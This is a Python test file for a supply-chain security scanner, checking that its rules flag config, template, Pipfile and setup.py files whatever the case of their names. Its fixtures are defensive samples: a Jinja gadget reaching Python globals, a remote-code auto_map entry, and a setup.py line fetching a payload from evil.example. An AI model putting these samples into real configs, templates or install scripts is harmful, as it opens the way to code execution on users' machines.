"""A file a rule selects by its name is read whatever the case of that name.

`test_suffix_case.py` holds the same promise for suffixes. A loader opens
`Config.json`, `PIPFILE` or `Chat_Template.jinja` on a case-insensitive filesystem,
and a rule that skipped them would leave the file unexamined and the run clean.
The two names live in separate directories: on a case-insensitive filesystem they
would be the same file.
"""

import json
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

import pytest
from guardana.core.rule import Rule, RuleContext
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain.chat_template import ChatTemplateRule
from guardana.rules.supply_chain.hallucinated_package import HallucinatedPackageRule
from guardana.rules.supply_chain.malicious_dependency import MaliciousDependencyRule
from guardana.rules.supply_chain.remote_code_config import RemoteCodeConfigRule

_GADGET = "{{ cycler.__init__.__globals__ }}"


@dataclass(frozen=True, slots=True)
class _Case:
    rule: Callable[[], Rule]
    name: str
    shouted: str
    content: bytes


_CASES = (
    _Case(
        RemoteCodeConfigRule,
        "config.json",
        "Config.JSON",
        json.dumps({"auto_map": {"AutoModel": "modeling_evil.EvilModel"}}).encode(),
    ),
    _Case(
        RemoteCodeConfigRule,
        "generation_config.json",
        "GENERATION_CONFIG.json",
        json.dumps({"auto_map": {"AutoModel": "modeling_evil.EvilModel"}}).encode(),
    ),
    _Case(
        ChatTemplateRule,
        "tokenizer_config.json",
        "Tokenizer_Config.json",
        json.dumps({"chat_template": _GADGET}).encode(),
    ),
    _Case(ChatTemplateRule, "chat_template.jinja", "Chat_Template.jinja", _GADGET.encode()),
    _Case(MaliciousDependencyRule, "Pipfile", "PIPFILE", b'ultralytics = "8.3.41"\n'),
    _Case(MaliciousDependencyRule, "Pipfile", "pipfile", b'ultralytics = "8.3.41"\n'),
    _Case(
        MaliciousDependencyRule,
        "setup.py",
        "Setup.py",
        b"from urllib.request import urlopen\nurlopen('http://evil.example/payload')\n",
    ),
)


def _anonymous(text: str, name: str) -> str:
    """Drop the file's name, as written or lowercased, so two names compare equal."""
    return text.replace(name, "<file>").replace(name.lower(), "<file>")


def _outcome(case: _Case, root: Path, name: str) -> list[tuple[object, ...]]:
    root.mkdir()
    (root / name).write_bytes(case.content)
    return [
        (
            f.rule_id,
            f.severity,
            f.title,
            _anonymous(f.evidence.summary, name),
            _anonymous(f.evidence.detail, name),
            f.verdict,
        )
        for f in case.rule().run(ArtifactTarget(root), RuleContext())
    ]


@pytest.mark.parametrize("case", _CASES, ids=[case.shouted for case in _CASES])
def test_a_name_in_another_case_gets_the_same_finding(tmp_path: Path, case: _Case) -> None:
    expected = _outcome(case, tmp_path / "as_written", case.name)
    assert expected, f"the fixture for {case.name} no longer produces a finding"

    assert _outcome(case, tmp_path / "shouted", case.shouted) == expected


def _hallucinated(root: Path, module_file: str) -> list[str]:
    root.mkdir()
    (root / "app.py").write_text("import helperlib\n", encoding="utf-8")
    (root / module_file).write_bytes(b"")
    return [
        f.target_ref for f in HallucinatedPackageRule().run(ArtifactTarget(root), RuleContext())
    ]


@pytest.mark.parametrize(
    "module_file",
    [
        "helperlib.pyi",
        "helperlib.cpython-312-x86_64-linux-gnu.so",
        "helperlib.pyd",
    ],
)
def test_a_local_module_in_any_importable_form_is_not_an_unknown_package(
    tmp_path: Path, module_file: str
) -> None:
    assert _hallucinated(tmp_path / "as_source", "helperlib.py") == []

    assert _hallucinated(tmp_path / "other", module_file) == []


@pytest.mark.parametrize("module_file", ["helperlib.txt", "helperlib.PY"])
def test_a_file_python_would_not_import_is_not_a_local_module(
    tmp_path: Path, module_file: str
) -> None:
    """The negative: Python matches a module suffix exactly, so `helperlib.PY` is no module."""
    assert _hallucinated(tmp_path / "other", module_file) == [
        str(tmp_path / "other" / "app.py") + ":1"
    ]
